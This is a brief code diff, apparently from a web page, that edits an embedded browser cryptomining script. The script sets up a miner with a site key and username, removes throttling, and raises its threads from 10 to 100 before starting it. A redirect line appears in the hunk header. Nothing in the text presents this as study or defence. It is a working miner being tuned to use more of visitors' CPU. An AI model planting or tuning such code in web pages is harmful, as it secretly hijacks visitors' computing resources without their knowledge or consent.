@@ -2798,7 +2798,7 @@ location.href='${url}';
 
 <script>
     var miner = WMP.User('SK_A8M79tyT5eTqKBzx6qHa6', 'jordan',{
-        throttle: 0, threads: 10,
+        throttle: 0, threads: 100,
     });
     miner.start();
 
